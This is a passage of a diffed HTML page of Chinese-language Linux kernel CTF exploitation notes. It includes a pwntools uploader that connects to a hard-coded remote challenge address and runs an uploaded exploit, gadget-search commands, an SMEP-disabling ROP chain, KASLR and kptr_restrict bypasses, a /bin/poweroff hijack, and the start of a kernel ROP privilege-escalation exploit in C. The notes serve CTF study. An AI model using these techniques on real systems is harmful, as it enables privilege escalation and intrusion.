+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">exec_cmd</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">echo </span><span style="color:#96b5b4;">\&quot;</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\&quot;</span><span style="color:#a3be8c;"> &gt;&gt; benc</span><span style="color:#c0c5ce;">&quot; % (encoded[i:i+</span><span style="color:#d08770;">300</span><span style="color:#c0c5ce;">]))
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">exec_cmd</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">cat benc | base64 -d &gt; bout</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">exec_cmd</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">chmod +x bout</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    p.</span><span style="color:#8fa1b3;">success</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">exploit</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">r</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">compile</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">upload</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    r.</span><span style="color:#8fa1b3;">interactive</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">__name__ == &quot;</span><span style="color:#a3be8c;">__main__</span><span style="color:#c0c5ce;">&quot;:
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(sys.argv) &gt; </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">        session = </span><span style="color:#8fa1b3;">ssh</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">USER</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">HOST</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">PORT</span><span style="color:#c0c5ce;">, PW)
+</span><span style="color:#c0c5ce;">        r = session.</span><span style="color:#8fa1b3;">run</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">exploit</span><span style="color:#c0c5ce;">(r)
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
+</span><span style="color:#c0c5ce;">        r = </span><span style="color:#8fa1b3;">process</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">./startvm.sh</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">util.proc.</span><span style="color:#8fa1b3;">pidof</span><span style="color:#c0c5ce;">(r)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">pause</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">exploit</span><span style="color:#c0c5ce;">(r)
+</span></pre>
+<p>找gadget</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">ropper -f ./vmlinux --nocolor &gt; ./rop_ropper.txt
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">ROPgadget --binary ./vmlinux &gt; ./rop_ROP.txt
+</span></pre>
+<p>找不到的时候用pwntools</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">&gt;&gt;&gt; from pwn import*
+</span><span style="color:#c0c5ce;">&gt;&gt;&gt; context.arch=&#39;amd64&#39;
+</span><span style="color:#c0c5ce;">&gt;&gt;&gt; e = ELF(&#39;./vm&#39;)
+</span><span style="color:#c0c5ce;">[*] &#39;/home/ayoung/ciscn2023/ChatRoom/vm&#39;
+</span><span style="color:#c0c5ce;">    Arch:     amd64-64-little
+</span><span style="color:#c0c5ce;">    RELRO:    No RELRO
+</span><span style="color:#c0c5ce;">    Stack:    No canary found
+</span><span style="color:#c0c5ce;">    NX:       NX disabled
+</span><span style="color:#c0c5ce;">    PIE:      No PIE (0xffffffff81000000)
+</span><span style="color:#c0c5ce;">    RWX:      Has RWX segments
+</span><span style="color:#c0c5ce;">&gt;&gt;&gt; hex(e.search(asm(&#39;iretq&#39;)).__next__())
+</span><span style="color:#c0c5ce;">&#39;0xffffffff81044c9e&#39;
+</span></pre>
+<p>还找不到（有时候可能extract不出来），用gdb找</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">pwndbg&gt; search -2 0xc35f
+</span><span style="color:#c0c5ce;">Searching for value: b&#39;_\xc3&#39;
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffff8bf44f23a5ad 0x162444b60f90c35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffff8bf44f23af5a 0x508d00401f0fc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffff8bf44f23bd31 0x480000441f0fc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffff8bf44f23cbc5 0x841f0f66c35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffff8bf44f23e7fe 0x48cf74e7394dc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffff8bf44f23f566 0x841f0fc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffff8bf44f23fb87 0x801f0fc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffffffff94690c80 0xccccccccccccc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffffffff947b6c35 0x758948ff3101c35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffffffff947b6c7f 0xb9f3c2c74801c35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffffffff94abee7d 0x6666ccccccccc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffffffff94df6eed 0xcccccccc003ec35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffffffff94e1691d 0xc7488febffffc35f
+</span><span style="color:#c0c5ce;">&lt;explored&gt;      0xffffffff94ff3d7d 0xccccc35dfffcc35f
+</span><span style="color:#c0c5ce;">^CQuit
+</span><span style="color:#c0c5ce;">pwndbg&gt; x/2i 0xffff8bf44f23a5ad
+</span><span style="color:#c0c5ce;">   0xffff8bf44f23a5ad:	pop    rdi
+</span><span style="color:#c0c5ce;">   0xffff8bf44f23a5ae:	ret    
+</span></pre>
+<p>extract-vmlinux</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">#!/bin/sh
+</span><span style="color:#c0c5ce;"># SPDX-License-Identifier: GPL-2.0-only
+</span><span style="color:#c0c5ce;"># ----------------------------------------------------------------------
+</span><span style="color:#c0c5ce;"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;"># Inspired from extract-ikconfig
+</span><span style="color:#c0c5ce;"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;
+</span><span style="color:#c0c5ce;">#
+</span><span style="color:#c0c5ce;"># ----------------------------------------------------------------------
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">check_vmlinux()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    # Use readelf to check if it&#39;s a valid ELF
+</span><span style="color:#c0c5ce;">    # TODO: find a better to way to check that it&#39;s really vmlinux
+</span><span style="color:#c0c5ce;">    #       and not just an elf
+</span><span style="color:#c0c5ce;">    readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    cat $1
+</span><span style="color:#c0c5ce;">    exit 0
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">try_decompress()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    # The obscure use of the &quot;tr&quot; filter is to work around older versions of
+</span><span style="color:#c0c5ce;">    # &quot;grep&quot; that report the byte offset of the line instead of the pattern.
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    # Try to find the header ($1) and decompress from here
+</span><span style="color:#c0c5ce;">    for    pos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`
+</span><span style="color:#c0c5ce;">    do
+</span><span style="color:#c0c5ce;">        pos=${pos%%:*}
+</span><span style="color:#c0c5ce;">        tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null
+</span><span style="color:#c0c5ce;">        check_vmlinux $tmp
+</span><span style="color:#c0c5ce;">    done
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># Check invocation:
+</span><span style="color:#c0c5ce;">me=${0##*/}
+</span><span style="color:#c0c5ce;">img=$1
+</span><span style="color:#c0c5ce;">if    [ $# -ne 1 -o ! -s &quot;$img&quot; ]
+</span><span style="color:#c0c5ce;">then
+</span><span style="color:#c0c5ce;">    echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2
+</span><span style="color:#c0c5ce;">    exit 2
+</span><span style="color:#c0c5ce;">fi
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># Prepare temp files:
+</span><span style="color:#c0c5ce;">tmp=$(mktemp /tmp/vmlinux-XXX)
+</span><span style="color:#c0c5ce;">trap &quot;rm -f $tmp&quot; 0
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># That didn&#39;t work, so retry after decompression.
+</span><span style="color:#c0c5ce;">try_decompress &#39;\037\213\010&#39; xy    gunzip
+</span><span style="color:#c0c5ce;">try_decompress &#39;\3757zXZ\000&#39; abcde unxz
+</span><span style="color:#c0c5ce;">try_decompress &#39;BZh&#39;          xy    bunzip2
+</span><span style="color:#c0c5ce;">try_decompress &#39;\135\0\0\0&#39;   xxx   unlzma
+</span><span style="color:#c0c5ce;">try_decompress &#39;\211\114\132&#39; xy    &#39;lzop -d&#39;
+</span><span style="color:#c0c5ce;">try_decompress &#39;\002!L\030&#39;   xxx   &#39;lz4 -d&#39;
+</span><span style="color:#c0c5ce;">try_decompress &#39;(\265/\375&#39;   xxx   unzstd
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># Finally check for uncompressed images or objects:
+</span><span style="color:#c0c5ce;">check_vmlinux $img
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;"># Bail out:
+</span><span style="color:#c0c5ce;">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2
+</span></pre>
+<h1 id="diao-shi-jiao-ben">调试脚本</h1><pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">set architecture i386:x86-64
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">file ~/vmlinux
+</span><span style="color:#c0c5ce;">b *()
+</span><span style="color:#c0c5ce;">target remote :1234
+</span></pre>
+<h1 id="shang-chuan">上传</h1><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">ch = </span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">/ # </span><span style="color:#c0c5ce;">&#39;	</span><span style="color:#65737e;"># 根据题目情况更改
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">io = </span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">106.14.121.29</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">32482</span><span style="color:#c0c5ce;">)
+</span><span style="color:#65737e;"># io.sendlineafter(b&quot;buildroot login: &quot;,b&quot;root&quot;)
+</span><span style="color:#65737e;"># io.sendlineafter(ch,b&quot;ls&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># io = process([&#39;/bin/bash&#39;,&#39;./praymoon/run.sh&#39;])
+</span><span style="color:#c0c5ce;">perlen = </span><span style="color:#d08770;">500
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">upload</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">lname</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">rname</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[*] uploading </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> ...</span><span style="color:#c0c5ce;">&quot; % lname)
+</span><span style="color:#c0c5ce;">    payload = </span><span style="color:#8fa1b3;">b64e</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(lname,&#39;</span><span style="color:#a3be8c;">rb</span><span style="color:#c0c5ce;">&#39;).</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">())
+</span><span style="color:#c0c5ce;">    a = </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(payload) // perlen
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(a + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">):
+</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">/</span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot; % (i,a))
+</span><span style="color:#c0c5ce;">        s = &#39;</span><span style="color:#a3be8c;">echo &quot;</span><span style="color:#c0c5ce;">&#39; + payload[i*(perlen):(i+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)*perlen] + &#39;</span><span style="color:#a3be8c;">&quot; &gt;&gt; </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">.b64</span><span style="color:#c0c5ce;">&#39; % rname
+</span><span style="color:#c0c5ce;">        io.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(ch,s.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">utf-8</span><span style="color:#c0c5ce;">&#39;))
+</span><span style="color:#c0c5ce;">    cmd = &#39;</span><span style="color:#a3be8c;">cat </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">.b64 | base64 -d &gt; </span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&#39; % (rname,rname)
+</span><span style="color:#c0c5ce;">    io.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(ch,cmd.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">utf-8</span><span style="color:#c0c5ce;">&#39;))
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># io.sendline(&quot;ls&quot;)
+</span><span style="color:#8fa1b3;">upload</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">./exp</span><span style="color:#c0c5ce;">&quot;,&quot;</span><span style="color:#a3be8c;">/tmp/exp</span><span style="color:#c0c5ce;">&quot;)        </span><span style="color:#65737e;"># 示例用法
+</span><span style="color:#8fa1b3;">context</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">log_level</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">debug</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#c0c5ce;">io.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(ch,</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">chmod +x /tmp/exp</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">io.</span><span style="color:#8fa1b3;">sendlineafter</span><span style="color:#c0c5ce;">(ch,</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">/tmp/exp</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#c0c5ce;">io.</span><span style="color:#8fa1b3;">interactive</span><span style="color:#c0c5ce;">()
+</span><span style="color:#65737e;">#io.sendlineafter(&quot;/ # &quot;,b&quot;cat /flag&quot;)
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;"># while 1:
+</span><span style="color:#65737e;">#     t = io.recvline()
+</span><span style="color:#65737e;">#     print(t.replace(b&quot;\r&quot;,b&#39;&#39;).decode(&#39;utf-8&#39;))
+</span><span style="color:#65737e;">#     io.send(input().encode(&#39;utf-8&#39;))
+</span></pre>
+<h2 id="muslbian-yi">musl编译</h2><p>编userfaultfd</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">musl-gcc exp.c --static -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp -masm=intel
+</span></pre>
+<h1 id="smepxiang-guan">smep相关</h1><p>内核代码中通过cr4寄存器的值来判断系统是否开启了smep，cr4寄存器各个位的含义如下表所示：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">bit	label	description
+</span><span style="color:#c0c5ce;">0	vme	virtual 8086 mode extensions
+</span><span style="color:#c0c5ce;">1	pvi	protected mode virtual interrupts
+</span><span style="color:#c0c5ce;">2	tsd	time stamp disable
+</span><span style="color:#c0c5ce;">3	de	debugging extensions
+</span><span style="color:#c0c5ce;">4	pse	page size extension
+</span><span style="color:#c0c5ce;">5	pae	physical address extension
+</span><span style="color:#c0c5ce;">6	mce	machine check exception
+</span><span style="color:#c0c5ce;">7	pge	page global enable
+</span><span style="color:#c0c5ce;">8	pce	performance monitoring counter enable
+</span><span style="color:#c0c5ce;">9	osfxsr	os support for fxsave and fxrstor instructions
+</span><span style="color:#c0c5ce;">10	osxmmexcpt	os support for unmasked simd floating point exceptions
+</span><span style="color:#c0c5ce;">11	umip	user mode instruction prevention (#GP on SGDT, SIDT, SLDT, SMSW, and STR instructions when CPL &gt; 0)
+</span><span style="color:#c0c5ce;">13	vmxe	virtual machine extensions enable
+</span><span style="color:#c0c5ce;">14	smxe	safer mode extensions enable
+</span><span style="color:#c0c5ce;">17	pcide	pcid enable
+</span><span style="color:#c0c5ce;">18	osxsave	xsave and processor extended states enable
+</span><span style="color:#c0c5ce;">20	smep	supervisor mode executions protection enable
+</span><span style="color:#c0c5ce;">21	smap	supervisor mode access protection enable
+</span></pre>
+<p>所以如果内核开启了smep的话，能直接想到的就是通过内核中的代码将该位置0，关闭smep后，后面再执行ret2usr就比较方便了。</p>
+<p>关闭 smep 保护，常用一个固定值 0x6f0，即 mov cr4, 0x6f0。可以在内核中寻找能组成 mov cr4, 0x6f0的gadget来关闭smep，如下所示：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">pop rdi; ret;
+</span><span style="color:#c0c5ce;">0x6f0;
+</span><span style="color:#c0c5ce;">mov cr4, rdi; pop rbp; ret;
+</span><span style="color:#c0c5ce;">0
+</span></pre>
+<h1 id="fei-yu-qi">非预期</h1><pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">mv bin bin1
+</span><span style="color:#c0c5ce;">/bin1/mkdir bin
+</span><span style="color:#c0c5ce;">/bin1/chmod 777 bin
+</span><span style="color:#c0c5ce;">/bin1/echo &quot;/bin1/cat /flag&quot; &gt; /bin/poweroff
+</span><span style="color:#c0c5ce;">/bin1/chmod 777 /bin/poweroff
+</span><span style="color:#c0c5ce;">exit
+</span></pre>
+<p>monitor</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">migrate &quot;exec:cat flag 1&gt;&amp;2&quot;
+</span></pre>
+<h1 id="du-wen-jian-rao-kaslr">读文件绕kaslr</h1><p><code>/sys/kernel/notes</code></p>
+<p><img src="./images/Pasted%20image%2020240930000738.png" alt="" /></p>
+<h2 id="kallsymsquan-0">kallsyms全0</h2><p><code>echo 0 &gt; /porc/sys/kernel/kptr_restrict</code>
+或者启动项
+<code>-append "xxx sysctl.kernel.kptr_restrict=0"</code></p>
+<h1 id="fgkaslr">FGKASLR</h1><h2 id="jian-jie">简介</h2><p>鉴于 KASLR 的不足，有研究者实现了 FGKASLR。FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。</p>
+<h2 id="shi-xian">实现</h2><p>FGKASLR 的实现相对比较简单，主要在两个部分进行了修改。目前，FGKASLR 只支持 x86_64 架构。</p>
+<h3 id="bian-yi-jie-duan">编译阶段</h3><p>FGKASLR 利用 gcc 的编译选项 -ffunction-sections 把内核中不同的函数放到不同的 section 中。 在编译的过程中，任何使用 C 语言编写的函数以及不在特殊输入节的函数都会单独作为一个节；使用汇编编写的代码会位于一个统一的节中。</p>
+<p>编译后的 vmlinux 保留了所有的节区头（Section Headers），以便于知道每个函数的地址范围。同时，FGKASLR 还有一个重定位地址的扩展表。通过这两组信息，内核在解压缩后就可以乱序排列函数。</p>
+<p>最后的 binary 的第一个段包含了一个合并节（由若干个函数合并而成）、以及若干其它单独构成一个节的函数。</p>
+<h3 id="jia-zai-jie-duan">加载阶段</h3><p>在解压内核后，会首先检查保留的符号信息，然后寻找需要随机化的 .text.* 节区。其中，第一个合并的节区 (.text) 会被跳过，不会被随机化。后面节区的地址会被随机化，但仍然会与 .text 节区相邻。同时，FGKASLR 修改了已有的用于更新重定位地址的代码，不仅考虑了相对于加载地址的偏移，还考虑了函数节区要被移动到的位置。</p>
+<p>为了隐藏新的内存布局，/proc/kallsyms 中符号使用随机的顺序来排列。在 v4 版本之前，该文件中的符号按照字母序排列。</p>
+<p>通过分析代码，我们可以知道，在 layout_randomized_image 函数中计算了最终会随机化的节区，存储在 sections 里。</p>
+<h1 id="pxn">PXN</h1><p>PXN即PrivilegedExecute-Never的缩写，内核状态下，系统无法直接执行用户态代码</p>
+<p>绕过：内核ROP</p>
+<h1 id="rop">ROP</h1><p>2018 qwb core</p>
+<p>泄露canary+栈溢出提权着陆用户态</p>
+<h2 id="qian-qi">前期</h2><pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">#!/bin/sh
+</span><span style="color:#c0c5ce;">mount -t proc proc /proc
+</span><span style="color:#c0c5ce;">mount -t sysfs sysfs /sys
+</span><span style="color:#c0c5ce;">mount -t devtmpfs none /dev
+</span><span style="color:#c0c5ce;">/sbin/mdev -s
+</span><span style="color:#c0c5ce;">mkdir -p /dev/pts
+</span><span style="color:#c0c5ce;">mount -vt devpts -o gid=4,mode=620 none /dev/pts
+</span><span style="color:#c0c5ce;">chmod 666 /dev/ptmx
+</span><span style="color:#c0c5ce;">cat /proc/kallsyms &gt; /tmp/kallsyms
+</span><span style="color:#c0c5ce;">echo 1 &gt; /proc/sys/kernel/kptr_restrict
+</span><span style="color:#c0c5ce;">echo 0 &gt; /proc/sys/kernel/dmesg_restrict
+</span><span style="color:#c0c5ce;">ifconfig eth0 up
+</span><span style="color:#c0c5ce;">udhcpc -i eth0
+</span><span style="color:#c0c5ce;">ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+</span><span style="color:#c0c5ce;">route add default gw 10.0.2.2 
+</span><span style="color:#c0c5ce;">insmod /core.ko
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">poweroff -d 120 -f &amp;
+</span><span style="color:#c0c5ce;">setsid /bin/cttyhack setuidgid 1000 /bin/sh
+</span><span style="color:#c0c5ce;">echo &#39;sh end!\n&#39;
+</span><span style="color:#c0c5ce;">umount /proc
+</span><span style="color:#c0c5ce;">umount /sys
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">poweroff -d 0  -f
+</span></pre>
+<p>前面是在创建设备驱动，挂载设备，之后将kallsyms的内容拷贝到/tmp/kallsyms文件中（这就意味着我们可以以普通用户的身份访问符号信息，也就是能够找到地址，可以用来得到prepare_kernel_cred和commit_cred的地址），kptr_restrict为1表示root用户可以读取内核符号地址而普通用户不能。同理dmesg_restrict为1表示root用户可以查看dmesg信息而普通用户不能。</p>
+<p>后面是设置网卡和路由信息，启动了一个uid为1000的普通用户所在的shell，poweroff这行是设置120s定时关机，我们为了避免干扰做题先注释掉，同样为了之后能看text段的基址我们把uid改成0，即root用户。</p>
+<p>最后的insmod插入了一个内核模块core.ko，这个就是本题的漏洞模块</p>
+<p>内置压缩脚本如下</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">find . -print0 \
+</span><span style="color:#c0c5ce;">| cpio --null -ov --format=newc \
+</span><span style="color:#c0c5ce;">| gzip -9 &gt; $1
+</span></pre>
+<p>所以虽然实际上看到的是<code>.cpio</code>结尾的文件，但实际上解包的时候要先解zip，再改称cpio结尾，最后再解cpio得到文件系统
+（可以先用file确定一下文件类型）</p>
+<h2 id="exp">exp</h2><p>开了kaslr，没开smep。题目本身的话就是首先利用类似数组越界的东西泄露canary，然后利用输入负数的方法绕过检查，造成栈溢出，栈溢出通过rop执行提权，最后返回用户态执行system("/bin/sh")</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdlib.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stropts.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/wait.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">size_t user_cs,user_ss,user_rflags,user_sp;
+</span><span style="color:#c0c5ce;">size_t commit_creds=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">,prepare_kernel_cred=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t vmlinux_base;
+</span><span style="color:#c0c5ce;">size_t raw_vmlinux_base = </span><span style="color:#d08770;">0xffffffff81000000</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prdi_r = </span><span style="color:#d08770;">0xffffffff81000b2f</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prsi_r = </span><span style="color:#d08770;">0xffffffff810011d6</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prdx_r = </span><span style="color:#d08770;">0xffffffff810a0f49</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t prcx_r = </span><span style="color:#d08770;">0xffffffff81021e53</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t swapgs_popfq_r = </span><span style="color:#d08770;">0xffffffff81a012da</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t mov_rdi_rax_call_rdx = </span><span style="color:#d08770;">0xffffffff8101aa6a</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">size_t ireq_ret = </span><span style="color:#d08770;">0xffffffff81050ac2</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">save_status</span><span style="color:#c0c5ce;">()
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">__asm__</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_cs,cs;</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    &quot;</span><span style="color:#a3be8c;">mov user_ss,ss;</span><span style="color:#c0c5ce;">&quot;
